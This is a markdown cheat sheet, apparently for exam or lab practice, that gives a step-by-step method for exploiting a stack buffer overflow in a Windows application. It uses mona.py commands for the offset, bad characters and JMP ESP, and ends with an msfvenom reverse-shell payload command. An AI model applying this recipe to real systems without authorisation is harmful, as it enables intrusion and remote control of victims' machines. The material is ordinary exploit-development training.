# Buffer Overflows
TLDR for Buffer Overflows...

## Methodology

###### Setup Immunity Debugger
- With **mona.py**, setup working folder based on program name:
```bash
!mona config -set workingfolder C:\logs\%p
```

###### Fuzzing
- Determine the RHOST/RPORT of the target box with the running application.
- Use the **fuzzer.py** template to configure a fuzzing script with Python3.
- Run the script against the target application, make note of when the app crashes (byte length + 400 extra bytes).

###### Offset
- Create your initial **exploit.py** script following the template.
- Generate a unique pattern equal to the length of bytes when the application crashed, you can do this with Metasploit's **pattern_create**.
```bash
pattern_create -l <length_of_bytes>
```
- Set the **payload** variable in the exploit script equal to the unique pattern.
- Run it against the application and with **mona.py** (in Immunity Debugger), determine the offset.
```bash
!mona findmsp -distance <length_of_bytes>
```
- The offset will be outlined as 'xxxx':
```txt
EIP contains normal pattern : 0x000000 (offset xxxx)
```
- Test that you can control the **EIP** now, to do this, modify your exploit script to include the value of the **offset** in its respectable variable.
- Modify the **retn** variable to 'BBBB' and the **payload** variable to an empty string.
- Use the script against the application again, make sure the EIP is now **42424242**.

###### Badchars
- With **mona.py**, generate a bytearray without `\x00` (null byte).
```bash
!mona bytearray -cpb "\x00"
```
- Using the **badchars.py** script, generate the same array and modify the **payload** variable in your exploit script with the output. Send it to the application again.
- Now with **mona.py**, compare the bytearray with the **ESP** address.
```bash
!mona compare -f C:\logs\<prgoram>\bytearray.bin -a <ESP_address>
```
- This will give you a list of all the badchars found, some may not be badchars however (remove the initial badchars first). Now generate a new bytearray with the badchars removed, update your script's **payload** variable to match, send it again and repeat this process until **mona.py**'s output is 'unmodified'.
- NOTE: You can also just review the **Hex dump** manually instead of using **mona.py** for identifying badchars.

###### Finding Jump Point
- With **mona.py** we can a find 'jump point' **JMP ESP**, make sure to exclude the badchars identified when doing this.
```bash
!mona jmp -r esp -cpb "\x00"
```
- This will show some results with different memory addresses, none of which will include badchars. Choose one, ideally with ASLR disabled.
- Modify your exploit script with the memory address identified in Little Endian format (backwards i.e. 0F6A32C2 = \xc2\x32\x6a\x0f) for the **retn** variable.

###### Payload Development
- Now, with Metasploit's **msfvenom**, generate shellcode in 'c' format and excluding your badchars.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<your-ip> LPORT=<your-port> EXITFUNC=thread -b "\x00" -f c
```
- Update your exploit script to include the output of the generated payload in the **payload** variable.
```python
payload = ("xxxx")
```
- Update your **padding** variable to include some NOPS (\x90), 32 to be safe, this will give your payload time to unpack.
```python
padding = "\x90" * 32
```
- Execute your exploit and catch a shell!
